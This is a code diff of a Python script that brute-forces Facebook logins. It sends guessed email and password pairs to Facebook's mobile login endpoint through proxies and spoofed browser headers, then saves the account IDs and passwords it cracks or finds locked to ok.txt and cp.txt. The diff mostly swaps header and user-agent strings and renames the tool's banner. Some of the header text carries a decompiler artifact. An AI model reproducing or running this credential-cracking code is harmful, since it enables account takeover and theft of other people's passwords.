@@ -225,8 +225,8 @@ logo ="""\033[1;32m
 loop = 0
 oks = []
 cps = []
-agents = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/221.0.461030601 Mobile/15E148 Safari/604.1"]
-os.system("xdg-open https://www.facebook.com/groups/1147689882563323/?ref=share")
+agents = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"]
+os.system("xdg-open https://facebook.com/groups/1147689882563323/")
 def main():
     os.system('clear')
     print(logo)
@@ -304,38 +304,36 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'p.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
+            header_freefb = {'authority':'m.facebook.com',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',}
-            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
+            'method': 'PATH',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'dnt':'1', 
+            'x-requested-with':'mark.via.gp', 
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-user': 'empty',
+            'sec-fetch-dest': 'document',
+            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
+            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\033[1;92m[SWATI-OK] '+cid+' | '+ps+'\033[0;97m')
+                print('\033[1;92m[SW4T1-OK] '+cid+' | '+ps+'\033[0;97m')
                 open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\033[1;95m[SWATI-CP] '+cid+' | '+ps+'\033[0;97m')
+                print('\033[1;95m[SW4T1-CP] '+cid+' | '+ps+'\033[0;97m')
                 open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
